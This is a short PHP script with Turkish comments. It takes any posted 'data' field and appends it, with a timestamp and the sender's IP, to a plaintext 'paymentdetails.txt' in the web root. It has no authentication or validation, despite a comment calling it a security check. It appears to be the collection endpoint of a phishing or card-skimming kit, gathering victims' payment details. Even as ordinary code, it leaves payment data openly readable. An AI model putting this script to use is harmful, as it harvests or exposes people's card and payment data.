<?php
// Basit güvenlik kontrolü
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['data'])) {
    $file = __DIR__ . '/paymentdetails.txt'; // /htdocs/paymentdetails.txt

    // Tarih + IP + veri eklenecek
    $entry = "=== NEW PAYMENT RECORD ===\n";
    $entry .= "Date: " . date('Y-m-d H:i:s') . "\n";
    $entry .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $entry .= $_POST['data'] . "\n\n------------------------------\n\n";

    // Append mode (varsa ekler)
    file_put_contents($file, $entry, FILE_APPEND | LOCK_EX);

    echo "OK";
} else {
    http_response_code(400);
    echo "Invalid request.";
}
?>
